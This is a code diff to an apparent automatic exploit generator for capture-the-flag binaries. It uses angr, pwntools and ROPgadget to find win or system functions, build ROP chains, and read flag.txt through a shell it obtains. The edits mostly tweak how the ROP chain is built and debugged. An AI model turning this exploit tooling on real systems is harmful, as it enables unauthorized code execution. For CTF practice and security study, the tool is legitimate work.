@@ -147,9 +147,13 @@ class rAEG:
             #for symb in self.elf.sym.keys:
             if "win" in self.elf.sym.keys():
                 self.exploit_function = "win"
-                goal = self.find_goal("win")
-                if goal != None:
-                    self.exploit_function = goal
+                assym = self.elf.disasm(self.elf.sym['win'], 100)
+                re_values = re.findall('cmp(.*)\n', assym)
+                params = []
+                for x in re_values:
+                    temp = int(x.split(', ')[1],16)
+                    params.append(p64(temp))
+                self.exploit_function = "win"
                 logger.info("Found win function")
             elif "system" in self.elf.sym.keys():
                 self.exploit_function = "system"
@@ -213,7 +217,7 @@ class rAEG:
                 stdin=self.symbolic_input,
                 add_options = angr.options.unicorn
         )
-        self.simgr = self.proj.factory.simgr(self.state, save_unconstrained=True)
+        self.simgr = self.proj.factory.simgr(self.state)#, save_unconstrained=True)
         self.simgr.stashes["mem_corrupt"] = []
         self.simgr.stashes["format_strings"] = []
 
@@ -351,7 +355,6 @@ class rAEG:
         for gadget in output:
             instructions = gadget.count(b";") + 1
             nops = gadget.count(b"nop")
-            instructions -= nops
             if instructions <= min_instructions:
                 min_instructions = instructions
                 min_gadget = gadget
@@ -492,8 +495,8 @@ class rAEG:
                     chain += param
 
         # To avoid movaps error for all chains put an extra ret to make the chain divisible by 16
-        if (len(chain) + self.chain_length + 8) % 16 != 0:
-            chain += p64(self.elf.sym["_fini"])
+        #if (len(chain) + self.chain_length + 8) % 16 != 0:
+            #chain += p64(self.elf.sym["_fini"])
         if function == "syscall":
             output = subprocess.check_output(["ROPgadget", "--binary", self.binary, "--only", "syscall"]).split(b"\n")
             output.pop(0)
@@ -507,11 +510,7 @@ class rAEG:
 
             chain += p64(syscall_gadget)
         else:
-            if type(function) == int:
-                print(hex(function))
-                chain += p64(function)
-            else:
-                chain += p64(self.elf.sym[function])
+            chain += p64(self.elf.sym[function])
         logger.info(f"Generated ROP chain for {function} with {len(parameters)} parameters")
 
         return chain
@@ -828,6 +827,8 @@ class rAEG:
 
         gs = """
             init-pwndbg
+            b vuln
+            b win
         """
         if args.GDB:
             return gdb.debug(self.binary, gdbscript=gs)
@@ -855,7 +856,7 @@ class rAEG:
             p.sendline(b"cat flag.txt")
             p.sendline(b"cat flag.txt")
             try:
-                output = p.recvall(timeout=2).decode()
+                output = p.recvall(timeout=30).decode()
                 self.flag = "flag{" + output.split("{")[1].split("}")[0] + "}"
                 print(self.flag)
             except:
